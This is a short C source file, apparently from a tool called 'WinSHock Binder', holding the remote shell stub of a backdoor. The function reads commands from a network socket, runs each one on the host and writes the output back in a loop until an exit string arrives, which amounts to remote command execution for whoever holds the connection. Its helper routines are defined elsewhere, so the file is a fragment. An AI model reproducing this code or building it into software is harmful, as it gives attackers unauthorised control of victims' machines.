// WinSHock Binder (WsBind) Shell Stub
// @idigitalflame

void wss_basic(SockData wsShellSock)
{
	int wsReadIn = 0;
	char *wsPrompt = calloc(strlen(WSS_BASIC_PROMPT) + 8, 1);
	char *wsInput = malloc(500), *wsReturn = malloc(500);
	sprintf(wsPrompt, WSS_BASIC_PROMPT, wsw_pid());
	while(1)
	{
		wsc_write(&wsShellSock, wsPrompt);
		wsReadIn = wsc_read(&wsShellSock, 500, wsInput);
		if(wsReadIn <= 0) break;
		if(wsu_index_of(WSS_BASIC_EXIT, wsInput) == 0) break;
		wsInput[wsReadIn - 1] = 0;
		wsp_execv(wsInput, &wsReturn, 1);
		wsc_write(&wsShellSock, wsReturn);
		wsc_write(&wsShellSock, WSB_NEWLINE);
		wsu_clear_buffer(&wsInput, 500);
	}
	free(wsPrompt);
	free(wsInput);
	free(wsReturn);
}